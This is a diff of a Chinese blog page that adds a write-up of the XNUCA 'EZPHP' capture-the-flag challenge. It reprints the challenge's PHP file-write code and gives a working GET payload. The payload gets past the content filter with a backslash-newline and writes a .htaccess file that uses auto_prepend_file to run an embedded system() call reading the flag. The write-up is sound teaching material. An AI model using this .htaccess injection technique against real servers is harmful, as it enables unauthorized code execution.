@@ -11,15 +11,20 @@
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="referrer" content="no-referrer">
   <!--more-->
-  <meta name="keywords" content="代码审计,文件上传">
+  <meta name="description" content="&amp;gt; 这题还是挺不错的，农大的同学赛后写了三种方法。。。tql👍">
+<meta name="keywords" content="代码审计,文件上传">
 <meta property="og:type" content="article">
 <meta property="og:title" content="XNUCA-EZPHP">
-<meta property="og:url" content="http://yoursite.com/2019/09/01/XNUCA-EZPHP/index.html">
+<meta property="og:url" content="http://yoursite.com/2019/09/02/XNUCA-EZPHP/index.html">
 <meta property="og:site_name" content="ddddhm | glotozz&#39;blog">
+<meta property="og:description" content="&amp;gt; 这题还是挺不错的，农大的同学赛后写了三种方法。。。tql👍">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2019-09-01T07:16:41.176Z">
+<meta property="og:image" content="https://i.loli.net/2019/09/02/ETLakZPK7qHUltg.png">
+<meta property="og:updated_time" content="2019-09-01T23:29:07.551Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="XNUCA-EZPHP">
+<meta name="twitter:description" content="&amp;gt; 这题还是挺不错的，农大的同学赛后写了三种方法。。。tql👍">
+<meta name="twitter:image" content="https://i.loli.net/2019/09/02/ETLakZPK7qHUltg.png">
   
   
     <link rel="icon" href="https://raw.githubusercontent.com/glotozz/images/master/bitbug_favicon.ico">
@@ -156,8 +161,8 @@
   
 
         
-        <a href="/2019/09/01/XNUCA-EZPHP/" class="archive-article-date">
-  	<time datetime="2019-09-01T07:13:56.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-01</time>
+        <a href="/2019/09/02/XNUCA-EZPHP/" class="archive-article-date">
+  	<time datetime="2019-09-01T23:13:56.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-02</time>
 </a>
         
       </header>
@@ -170,8 +175,24 @@
     <div class="article-entry" itemprop="articleBody">
       
         <meta name="referrer" content="no-referrer">
+> 这题还是挺不错的，农大的同学赛后写了三种方法。。。tql👍
+
 <a id="more"></a>
 
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    $files = scandir(&apos;./&apos;);  </span><br><span class="line">    foreach($files as $file) &#123; </span><br><span class="line">        if(is_file($file))&#123; </span><br><span class="line">            if ($file !== &quot;index.php&quot;) &#123; </span><br><span class="line">                unlink($file); </span><br><span class="line">            &#125; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    include_once(&quot;fl3g.php&quot;); </span><br><span class="line">    if(!isset($_GET[&apos;content&apos;]) || !isset($_GET[&apos;filename&apos;])) &#123; </span><br><span class="line">        highlight_file(__FILE__); </span><br><span class="line">        die(); </span><br><span class="line">    &#125; </span><br><span class="line">    $content = $_GET[&apos;content&apos;]; </span><br><span class="line">    if(stristr($content,&apos;on&apos;) || stristr($content,&apos;html&apos;) || stristr($content,&apos;type&apos;) || stristr($content,&apos;flag&apos;) || stristr($content,&apos;upload&apos;) || stristr($content,&apos;file&apos;)) &#123; </span><br><span class="line">        echo &quot;Hacker&quot;; </span><br><span class="line">        die(); </span><br><span class="line">    &#125; </span><br><span class="line">    $filename = $_GET[&apos;filename&apos;]; </span><br><span class="line">    if(preg_match(&quot;/[^a-z\.]/&quot;, $filename) == 1) &#123; </span><br><span class="line">        echo &quot;Hacker&quot;; </span><br><span class="line">        die(); </span><br><span class="line">    &#125; </span><br><span class="line">    $files = scandir(&apos;./&apos;);  </span><br><span class="line">    foreach($files as $file) &#123; </span><br><span class="line">        if(is_file($file))&#123; </span><br><span class="line">            if ($file !== &quot;index.php&quot;) &#123; </span><br><span class="line">                unlink($file); </span><br><span class="line">            &#125; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    file_put_contents($filename, $content . &quot;\nJust one chance&quot;); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>简单分析，先列出当前文件夹下所有文件，删除除index.php外的文件，包含一个fl3g.php，传参，对文件名和文件内容分别有一个preg_match和stristr过滤，再删除一次文件，最后file_put_contents，也就是我们的利用点</p>
+</blockquote>
+<p>这里记录下最简单、最容易理解的一种方法，.htaccess和.user.ini都支持在开头文件包含，但是生效的条件不同</p>
+<p>用\n绕过stristr的检测，文件名用.htaccess（主要是这里不支持.user.ini，需要cgi/fcgi模式），preg_match()就不需要绕过，并且理论上我们写的是开头自动包含，会在删除前执行我们包含的马</p>
+<p>构造</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?content=php_value%20auto_prepend_fil\%0ae%20.htaccess%0a%23&lt;?</span><br><span class="line">php%20system(&apos;cat%20/fla&apos;.&apos;g&apos;);?&gt;\&amp;filename=.htaccess</span><br></pre></td></tr></table></figure>
+
+<p>，那么写入.htaccess的内容为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_prepend_fil\</span><br><span class="line">e .htaccess</span><br><span class="line">#&lt;?php system(&apos;cat /fla&apos;.&apos;g&apos;);?&gt;\</span><br><span class="line">Just one chance</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2019/09/02/ETLakZPK7qHUltg.png" alt="Snipaste_2019-09-02_07-26-45.png"></p>
 
       
 
@@ -271,7 +292,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/09/01/XNUCA-EZPHP/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/09/02/XNUCA-EZPHP/" alt="微信分享二维码">
     </div>
 </div>
 
